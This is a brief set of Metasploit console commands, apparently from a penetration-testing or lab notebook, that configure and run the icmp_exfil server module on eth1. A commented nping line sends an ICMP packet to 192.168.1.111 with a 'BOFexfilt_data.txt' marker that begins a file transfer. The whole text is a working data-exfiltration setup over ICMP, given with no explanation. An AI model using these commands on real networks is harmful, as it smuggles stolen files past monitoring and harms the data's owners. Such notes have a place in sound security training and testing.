use auxiliary/server/icmp_exfil
set INTERFACE eth1
set BPF_FILTER icmp and not src 192.168.1.111
run

### nping 192.168.1.111 --icmp -c1 --data-string "BOFexfilt_data.txt"
